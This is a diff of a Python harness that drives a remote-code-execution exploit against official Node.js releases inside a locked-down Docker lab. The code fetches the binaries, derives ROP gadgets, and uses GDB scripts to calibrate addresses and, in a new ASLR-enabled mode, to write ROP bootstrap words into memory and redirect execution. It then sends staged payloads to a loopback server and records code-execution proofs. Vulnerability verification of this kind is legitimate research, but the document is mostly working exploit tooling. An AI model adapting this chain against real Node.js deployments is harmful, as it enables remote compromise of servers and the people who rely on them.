@@ -2,9 +2,11 @@
 """Verify every officially affected Node release in the isolated local lab.
 
 The runner downloads official linux-x64 archives, verifies SHASUMS256, derives
-binary-specific ROP facts, performs a read-only GDB address calibration with
-ASLR disabled, and accepts only the bundled /n2s nonce + id proof returned on
-the exploited loopback request socket.
+binary-specific ROP facts, and accepts only the bundled /n2s nonce + id proof
+returned on the exploited loopback request socket.  Its default mode performs
+GDB address calibration with ASLR disabled.  The explicit debugger-steered
+mode leaves ASLR enabled but uses GDB to create the current request's expected
+return state; that mode is a chain validation, not an ASLR bypass.
 """
 
 from __future__ import annotations
@@ -30,6 +32,7 @@ import urllib.request
 ROOT = Path(__file__).parents[1]
 PROFILE_DIR = ROOT / "poc" / "profiles"
 EVIDENCE_DIR = ROOT / "evidence" / "matrix"
+ASLR_EVIDENCE_DIR = ROOT / "evidence" / "aslr-on-debugger-steered"
 WORK_PARENT = Path(
     os.environ.get("N2S_MATRIX_WORKDIR", str(Path.home() / "node2shell-matrix"))
 )
@@ -41,6 +44,10 @@ DIST_BASE = "https://nodejs.org/dist"
 FIXED = {22: (22, 23, 4), 24: (24, 22, 1), 26: (26, 12, 1)}
 CAL_PATTERN = re.compile(
     r"N2S_CAL ring=(0x[0-9a-f]+) source=(0x[0-9a-f]+) "
+    r"saved=(0x[0-9a-f]+) dest=(0x[0-9a-f]+)"
+)
+ASLR_STEER_PATTERN = re.compile(
+    r"N2S_ASLR ring=(0x[0-9a-f]+) source=(0x[0-9a-f]+) "
     r"saved=(0x[0-9a-f]+) dest=(0x[0-9a-f]+)"
 )
 
@@ -147,14 +154,15 @@ def stop_container() -> None:
     docker("rm", "-f", CONTAINER, check=False)
 
 
-def start_container(binary: Path) -> None:
+def start_container(binary: Path, *, aslr_enabled: bool = False) -> None:
     stop_container()
-    completed = docker(
+    arguments = [
         "run",
         "--platform", "linux/amd64",
         "-d",
         "--name", CONTAINER,
         "--label", "org.openai.node2shell-lab=true",
+        "--label", f"org.openai.node2shell-aslr={'enabled' if aslr_enabled else 'disabled'}",
         "--read-only",
         "--tmpfs", "/tmp:rw,noexec,nosuid,size=16m",
         "--cap-drop", "ALL",
@@ -164,12 +172,31 @@ def start_container(binary: Path) -> None:
         "--memory", "512m",
         "--cpus", "1.0",
         "--network", "host",
-        "-e", "N2S_DISABLE_ASLR=1",
-        "-v", f"{binary}:/usr/local/bin/node:ro",
-        IMAGE,
-    )
+    ]
+    if not aslr_enabled:
+        arguments.extend(("-e", "N2S_DISABLE_ASLR=1"))
+    arguments.extend(("-v", f"{binary}:/usr/local/bin/node:ro", IMAGE))
+    completed = docker(*arguments)
     if not completed.stdout.strip():
         raise RuntimeError("Docker did not return a container id")
+
+
+def verify_aslr_runtime() -> dict[str, object]:
+    value = docker(
+        "exec", CONTAINER, "cat", "/proc/sys/kernel/randomize_va_space"
+    ).stdout.strip()
+    if value != "2":
+        raise RuntimeError(f"expected randomize_va_space=2, got {value!r}")
+    environment = json.loads(
+        docker("inspect", "--format", "{{json .Config.Env}}", CONTAINER).stdout
+    )
+    disabled = any(item == "N2S_DISABLE_ASLR=1" for item in environment)
+    if disabled:
+        raise RuntimeError("ASLR mode unexpectedly contains N2S_DISABLE_ASLR=1")
+    return {
+        "kernel_randomize_va_space": 2,
+        "n2s_disable_aslr_present": False,
+    }
 
 
 def node_pid() -> int:
@@ -296,13 +323,13 @@ def calibrate(profile, binary: Path, pid: int) -> dict[str, int | str]:
             pass
         try:
             remainder, _ = debugger.communicate(timeout=12)
-        finally:
-            if debugger.poll() is None:
-                debugger.terminate()
-                try:
-                    debugger.wait(timeout=2)
-                except subprocess.TimeoutExpired:
-                    debugger.kill()
+        except subprocess.TimeoutExpired:
+            debugger.terminate()
+            try:
+                remainder, _ = debugger.communicate(timeout=3)
+            except subprocess.TimeoutExpired:
+                debugger.kill()
+                remainder, _ = debugger.communicate(timeout=3)
         transcript = "".join(prefix) + remainder
     match = CAL_PATTERN.search(transcript)
     if match is None:
@@ -322,6 +349,136 @@ def calibrate(profile, binary: Path, pid: int) -> dict[str, int | str]:
         "target_saved_rbp_slot": target,
         "position": position,
         "source_offset": source_offset,
+        "transcript_tail": transcript[-1200:],
+    }
+
+
+def run_aslr_debugger_steered(
+    profile,
+    binary: Path,
+    pid: int,
+    token: bytes,
+) -> tuple[dict[str, object], dict[str, int | str]]:
+    """Prove the fixed chain with ASLR on using current-request GDB steering.
+
+    This deliberately does not claim an ASLR bypass.  GDB reads the current
+    request's ring/frame addresses at the vulnerable store, patches only the
+    ring-relative bootstrap words, and resumes at the return-state equivalent
+    of the constrained saved-RBP/leave-ret chain.
+    """
+    raw = profile.raw
+    ring = gdb_expression(str(raw["copy_ring_expression"]))
+    source = "$" + str(raw["copy_source_register"])
+    destination = gdb_expression(str(raw["copy_destination_expression"]))
+    bootstrap = profile.n("bootstrap_prefix_offset")
+    rax_base = profile.n("rax_base_prefix_offset")
+    script = "\n".join(
+        (
+            "set pagination off",
+            "set confirm off",
+            "set debuginfod enabled off",
+            f"break *{profile.n('copy_breakpoint'):#x}",
+            "commands 1",
+            "  silent",
+            f"  set $n2s_ring = {ring}",
+            f"  set $n2s_source = {source}",
+            "  set $n2s_resume_rsp = $rbp + 16",
+            (
+                '  printf "N2S_ASLR ring=%p source=%p saved=%p dest=%p\\n", '
+                f"$n2s_ring, $n2s_source, $rbp+8, {destination}"
+            ),
+            f"  set {{unsigned long long}}($n2s_ring + {bootstrap:#x}) = 0",
+            (
+                f"  set {{unsigned long long}}($n2s_ring + {bootstrap + 8:#x}) = "
+                f"{profile.n('pop_rax_ret'):#x}"
+            ),
+            (
+                f"  set {{unsigned long long}}($n2s_ring + {bootstrap + 16:#x}) = "
+                f"$n2s_ring + {rax_base:#x}"
+            ),
+            "  set $rsp = $n2s_resume_rsp",
+            f"  set $rbp = $n2s_ring + {bootstrap:#x}",
+            f"  set $pc = {profile.n('leave_ret'):#x}",
+            "  detach",
+            "  quit",
+            "end",
+            "continue",
+            "",
+        )
+    )
+    with tempfile.NamedTemporaryFile("w", encoding="utf-8", suffix=".gdb") as commands:
+        commands.write(script)
+        commands.flush()
+        debugger = subprocess.Popen(
+            ["gdb", "-q", "-batch", str(binary), "-p", str(pid), "-x", commands.name],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
+        )
+        prefix = wait_gdb_armed(debugger)
+        first = POC.build_stage_one(profile)
+        position = int(raw["staged_positions"][0], 0)
+        second = POC.build_stage_two(position, profile.n("second_stage_size"))
+        response = POC.send_stages(
+            first,
+            second,
+            float(raw["stage_delay_seconds"]),
+            15.0,
+        )
+        try:
+            remainder, _ = debugger.communicate(timeout=12)
+        except subprocess.TimeoutExpired:
+            debugger.terminate()
+            try:
+                remainder, _ = debugger.communicate(timeout=3)
+            except subprocess.TimeoutExpired:
+                debugger.kill()
+                remainder, _ = debugger.communicate(timeout=3)
+        transcript = "".join(prefix) + remainder
+    match = ASLR_STEER_PATTERN.search(transcript)
+    if match is None:
+        raise RuntimeError(
+            "GDB returned no current-request ASLR record: "
+            + transcript[-2000:].replace("\n", " | ")
+        )
+    ring_value, source_value, saved, destination_value = (
+        int(value, 16) for value in match.groups()
+    )
+    proof = POC.verify(response, token)
+    observation = {
+        "attempt": 1,
+        "position": f"0x{position:x}",
+        "response_bytes": len(response),
+        "proof": proof is not None,
+        "outcome": POC.classify_response(response, proof),
+    }
+    if proof is None:
+        result: dict[str, object] = {
+            "result": "not-verified",
+            "profile": raw["id"],
+            "observations": [observation],
+        }
+    else:
+        marker, identity = proof
+        result = {
+            "result": "rce-verified",
+            "profile": raw["id"],
+            "proof_marker": marker,
+            "proof_command": "/n2s (fixed nonce + /usr/bin/id)",
+            "proof_stdout": identity,
+            "proof_channel": "exploited HTTP request socket",
+            "successful_attempt": 1,
+            "observations": [observation],
+        }
+    return result, {
+        "ring": ring_value,
+        "observed_source": source_value,
+        "observed_destination": destination_value,
+        "saved_return_slot": saved,
+        "target_saved_rbp_slot": saved - 8,
+        "source_offset": source_value - ring_value,
+        "position": position,
         "transcript_tail": transcript[-1200:],
     }
 
@@ -367,63 +524,109 @@ def save_json(path: Path, value: object) -> None:
     path.write_text(json.dumps(value, ensure_ascii=False, indent=2, sort_keys=True) + "\n", encoding="utf-8")
 
 
-def verify_one(version: str) -> dict[str, object]:
+def verify_one(version: str, *, aslr_enabled: bool = False) -> dict[str, object]:
     print(f"MATRIX version={version} phase=download", flush=True)
     with tempfile.TemporaryDirectory(prefix=f"v{version}-", dir=WORK_PARENT) as temporary:
         directory = Path(temporary)
         binary, archive_sha, archive_url = fetch_official_binary(version, directory)
         analysis = ANALYZER.extract(binary)
         profile = initial_profile(analysis, version)
-        print(f"MATRIX version={version} phase=calibrate", flush=True)
-        start_container(binary)
+        print(
+            f"MATRIX version={version} "
+            f"phase={'debugger-steer' if aslr_enabled else 'calibrate'}",
+            flush=True,
+        )
+        start_container(binary, aslr_enabled=aslr_enabled)
         try:
-            wait_ready(profile)
-            calibration_pid = node_pid()
-            calibration = calibrate(profile, binary, calibration_pid)
+            aslr_runtime = verify_aslr_runtime() if aslr_enabled else {}
             raw = copy.deepcopy(profile.raw)
-            raw["ring_base"] = f"0x{int(calibration['ring']):x}"
-            raw["copy_source_offset"] = f"0x{int(calibration['source_offset']):x}"
-            raw["staged_positions"] = [f"0x{int(calibration['position']):x}"]
-            chain_qwords = 12 + int(raw.get("execvp_base_padding", 0))
-            raw.update(choose_layout(int(calibration["source_offset"]), chain_qwords))
-            profile = POC.Profile(raw)
-
-            token = wait_ready(profile)
-            active_pid = node_pid()
-            raw["accepted_socket_fd"] = first_free_fd(active_pid)
-            profile = POC.Profile(raw)
-            PROFILE_DIR.mkdir(parents=True, exist_ok=True)
-            save_json(PROFILE_DIR / f"{version}.json", raw)
-
-            print(
-                f"MATRIX version={version} phase=verify position={raw['staged_positions'][0]} "
-                f"source={raw['copy_source_offset']} fd={raw['accepted_socket_fd']}",
-                flush=True,
-            )
-            result = POC.run(profile, 8, 15.0)
+            if aslr_enabled:
+                chain_qwords = 12 + int(raw.get("execvp_base_padding", 0))
+                raw.update(choose_layout(int(raw["copy_source_offset"], 0), chain_qwords))
+                token = wait_ready(profile)
+                active_pid = node_pid()
+                raw["accepted_socket_fd"] = first_free_fd(active_pid)
+                profile = POC.Profile(raw)
+                print(
+                    f"MATRIX version={version} phase=verify "
+                    f"source={raw['copy_source_offset']} fd={raw['accepted_socket_fd']}",
+                    flush=True,
+                )
+                result, calibration = run_aslr_debugger_steered(
+                    profile, binary, active_pid, token
+                )
+                calibration_record = {
+                    "ring_base": f"0x{int(calibration['ring']):x}",
+                    "observed_source": f"0x{int(calibration['observed_source']):x}",
+                    "observed_destination": f"0x{int(calibration['observed_destination']):x}",
+                    "saved_return_slot": f"0x{int(calibration['saved_return_slot']):x}",
+                    "target_saved_rbp_slot": f"0x{int(calibration['target_saved_rbp_slot']):x}",
+                    "copy_source_offset": f"0x{int(calibration['source_offset']):x}",
+                    "staged_position": raw["staged_positions"][0],
+                    "accepted_socket_fd": raw["accepted_socket_fd"],
+                    "steering": (
+                        "same-request GDB return-state steering; "
+                        "this is not an ASLR bypass"
+                    ),
+                }
+            else:
+                wait_ready(profile)
+                calibration_pid = node_pid()
+                calibration = calibrate(profile, binary, calibration_pid)
+                raw["ring_base"] = f"0x{int(calibration['ring']):x}"
+                raw["copy_source_offset"] = f"0x{int(calibration['source_offset']):x}"
+                raw["staged_positions"] = [f"0x{int(calibration['position']):x}"]
+                chain_qwords = 12 + int(raw.get("execvp_base_padding", 0))
+                raw.update(choose_layout(int(calibration["source_offset"]), chain_qwords))
+                profile = POC.Profile(raw)
+                token = wait_ready(profile)
+                active_pid = node_pid()
+                raw["accepted_socket_fd"] = first_free_fd(active_pid)
+                profile = POC.Profile(raw)
+                PROFILE_DIR.mkdir(parents=True, exist_ok=True)
+                save_json(PROFILE_DIR / f"{version}.json", raw)
+                print(
+                    f"MATRIX version={version} phase=verify "
+                    f"position={raw['staged_positions'][0]} "
+                    f"source={raw['copy_source_offset']} fd={raw['accepted_socket_fd']}",
+                    flush=True,
+                )
+                result = POC.run(profile, 8, 15.0)
+                calibration_record = {
+                    "ring_base": f"0x{int(calibration['ring']):x}",
+                    "observed_source": f"0x{int(calibration['observed_source']):x}",
+                    "observed_destination": f"0x{int(calibration['observed_destination']):x}",
+                    "saved_return_slot": f"0x{int(calibration['saved_return_slot']):x}",
+                    "target_saved_rbp_slot": f"0x{int(calibration['target_saved_rbp_slot']):x}",
+                    "copy_source_offset": raw["copy_source_offset"],
+                    "staged_position": raw["staged_positions"][0],
+                    "accepted_socket_fd": raw["accepted_socket_fd"],
+                }
             result.update(
                 {
                     "version": version,
-                    "verification_mode": "official-linux-x64-aslr-disabled-isolated-docker",
+                    "verification_mode": (
+                        "official-linux-x64-aslr-enabled-debugger-steered-isolated-docker"
+                        if aslr_enabled
+                        else "official-linux-x64-aslr-disabled-isolated-docker"
+                    ),
                     "official_archive_url": archive_url,
                     "official_archive_sha256": archive_sha,
                     "node_binary_sha256": analysis["node_binary_sha256"],
-                    "calibration": {
-                        "ring_base": f"0x{int(calibration['ring']):x}",
-                        "observed_source": f"0x{int(calibration['observed_source']):x}",
-                        "observed_destination": f"0x{int(calibration['observed_destination']):x}",
-                        "saved_return_slot": f"0x{int(calibration['saved_return_slot']):x}",
-                        "target_saved_rbp_slot": f"0x{int(calibration['target_saved_rbp_slot']):x}",
-                        "copy_source_offset": raw["copy_source_offset"],
-                        "staged_position": raw["staged_positions"][0],
-                        "accepted_socket_fd": raw["accepted_socket_fd"],
-                    },
+                    "calibration": calibration_record,
                     "lab_controls": {
                         "target": "127.0.0.1:3000",
                         "read_only_rootfs": True,
                         "cap_drop": "ALL",
                         "no_new_privileges": True,
                         "proof_program": "/n2s (fixed nonce + /usr/bin/id)",
+                        "aslr": "enabled" if aslr_enabled else "disabled",
+                        "address_calibration": (
+                            "same-request GDB return-state steering; this is not an ASLR bypass"
+                            if aslr_enabled
+                            else "same-process GDB with ASLR disabled"
+                        ),
+                        **aslr_runtime,
                     },
                     "calibration_token_before_verify": token.decode(),
                     "verified_at": datetime.now(timezone.utc).isoformat(),
@@ -434,11 +637,15 @@ def verify_one(version: str) -> dict[str, object]:
             stop_container()
 
 
-def write_summary(scope: list[str]) -> dict[str, object]:
+def write_summary(
+    scope: list[str],
+    evidence_dir: Path = EVIDENCE_DIR,
+    verification_mode: str = "official-linux-x64-aslr-disabled-isolated-docker",
+) -> dict[str, object]:
     verified: list[str] = []
     failed: dict[str, str] = {}
     for version in scope:
-        path = EVIDENCE_DIR / f"{version}.json"
+        path = evidence_dir / f"{version}.json"
         if not path.exists():
             failed[version] = "missing evidence"
             continue
@@ -457,9 +664,10 @@ def write_summary(scope: list[str]) -> dict[str, object]:
         "rce_verified_versions": verified,
         "failed_or_unverified": failed,
         "complete": len(verified) == len(scope),
+        "verification_mode": verification_mode,
         "generated_at": datetime.now(timezone.utc).isoformat(),
     }
-    save_json(EVIDENCE_DIR / "summary.json", summary)
+    save_json(evidence_dir / "summary.json", summary)
     return summary
 
 
@@ -468,7 +676,23 @@ def main() -> int:
     parser.add_argument("--version", action="append", help="verify only this exact release")
     parser.add_argument("--limit", type=int, help="process at most N selected releases")
     parser.add_argument("--include-verified", action="store_true")
+    parser.add_argument(
+        "--aslr",
+        choices=("disabled", "debugger-steered"),
+        default="disabled",
+        help=(
+            "leave ASLR enabled and steer the current request's return state with GDB; "
+            "this validates the fixed ROP chain under ASLR but is not an ASLR bypass"
+        ),
+    )
     args = parser.parse_args()
+    aslr_enabled = args.aslr == "debugger-steered"
+    evidence_dir = ASLR_EVIDENCE_DIR if aslr_enabled else EVIDENCE_DIR
+    verification_mode = (
+        "official-linux-x64-aslr-enabled-debugger-steered-isolated-docker"
+        if aslr_enabled
+        else "official-linux-x64-aslr-disabled-isolated-docker"
+    )
     scope = official_scope()
     selected = args.version or scope
     unknown = sorted(set(selected) - set(scope), key=semver)
@@ -479,8 +703,8 @@ def main() -> int:
             version
             for version in selected
             if not (
-                (EVIDENCE_DIR / f"{version}.json").exists()
-                and json.loads((EVIDENCE_DIR / f"{version}.json").read_text(encoding="utf-8")).get("result")
+                (evidence_dir / f"{version}.json").exists()
+                and json.loads((evidence_dir / f"{version}.json").read_text(encoding="utf-8")).get("result")
                 == "rce-verified"
             )
         ]
@@ -488,9 +712,9 @@ def main() -> int:
         selected = selected[: args.limit]
     failures = 0
     for version in selected:
-        evidence_path = EVIDENCE_DIR / f"{version}.json"
+        evidence_path = evidence_dir / f"{version}.json"
         try:
-            result = verify_one(version)
+            result = verify_one(version, aslr_enabled=aslr_enabled)
         except Exception as error:
             result = {
                 "version": version,
@@ -504,7 +728,7 @@ def main() -> int:
         print(f"MATRIX version={version} result={result['result']}", flush=True)
         if result.get("result") != "rce-verified":
             failures += 1
-    summary = write_summary(scope)
+    summary = write_summary(scope, evidence_dir, verification_mode)
     print(json.dumps(summary, ensure_ascii=False, indent=2), flush=True)
     return 1 if failures else 0
 
